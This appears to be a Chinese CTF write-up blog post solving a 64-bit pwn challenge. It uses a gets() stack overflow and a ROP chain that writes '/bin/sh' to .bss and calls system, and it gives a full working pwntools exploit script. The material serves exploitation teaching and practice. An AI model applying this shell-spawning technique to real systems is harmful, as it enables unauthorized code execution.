---
layout: post
title:  "记一道简单的pwn解题过程"
date:   2020-12-16
categories: pwn gets system stackoverflow
---

记录一下一道简单的pwn题目。 可以在这[下载elf文件](/note/assets/pwn/magicstring)  

先用gdb调试一下elf文件，只有一个简单的main函数  

![docs](/note/assets/magicstring-asm.png)  

看汇编代码可以发现，64位程序，调用了system和gets函数，这里gets函数是可以直接溢出的。程序开始抬高了栈0x2a0个字节，main函数栈帧为672字节。然后程序保护项只开了NX保护，意味着不能通过栈去ret2shellcode。  
这里有了溢出点和system函数，最重要的两个因素。 但是还差一个shell和一个可控的参数传递。  
众所周知，64位程序传参需要用到寄存器，依次是rdi、rsi、rdx、rcx、r8、r9，而32位直接通过栈就可以了，所以需要找到可控的rdi寄存器。   
这里开始构造ROP链，推荐一款工具叫 `ropper`，跟ROPGadget差不多，但是总感觉ropper更好用。  
找一下rdi和sh：
```bash
$ ropper  --file magicstring --search 'pop rdi|ret'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi|ret

[INFO] File: magicstring
0x0000000000400733: pop rdi; ret; 
0x0000000000400532: ret 0x200a; 
0x0000000000400649: ret 0x8b48; 
0x00000000004005b5: ret 0xc148; 
0x00000000004004d1: ret; 

$ ropper --file magicstring --string '/bin/sh'


Strings
=======

Address  Value  
-------  -----  

$ ropper --file magicstring --string 'sh'


Strings
=======

Address  Value  
-------  -----  

$ ropper --file magicstring --string '$0'


Strings
=======

Address  Value  
-------  -----  

$ 
```
可以找到rdi：0x0000000000400733， 但是遗憾的是找不到sh和$0。  
所以麻烦点，只能通过写bss段，然后再把bss弹到rdi里面去实现getshell了  
通过三次gets调用达到getshell，第一次将bss写入rdi，第二次正常执行gets将/bin/sh写入bss，第三次写bss到rdi再调用system。  

第一次
```python
payload = b'A' * offset + rbp + pop_rdi + bss + gets + main
```

第二次
```python
payload = b'/bin/sh\x00'
```

第三次
```python
payload = b'A' * offset + rbp + pop_rdi + bss + system
```

最终exp为：
```python
#!/usr/bin/env python
# coding=utf-8

from pwn import *

#context.log_level='debug'
offset = 0x2a0

pop_rdi = p64(0x0000000000400733)
gets = p64(0x400510)
system = p64(0x4004f0)
main = p64(0x400661)
rbp = p64(0x7fffffffe040)

#p = remote('111.231.70.44', 28042)
p = process('magicstring')
print(p.recv())
elf = ELF('magicstring')
bss = p64(elf.bss()+0x30)
payload = b'A' * offset + rbp + pop_rdi + bss + gets + main

p.sendline(payload)
#gdb.attach(p)
p.sendline(b'/bin/sh\x00')
payload2 = b'A' * offset + rbp + pop_rdi + bss + system
p.sendline(payload2)
print(p.recv())
p.interactive()
```

![docs](/note/assets/magicstring-exp.png)  
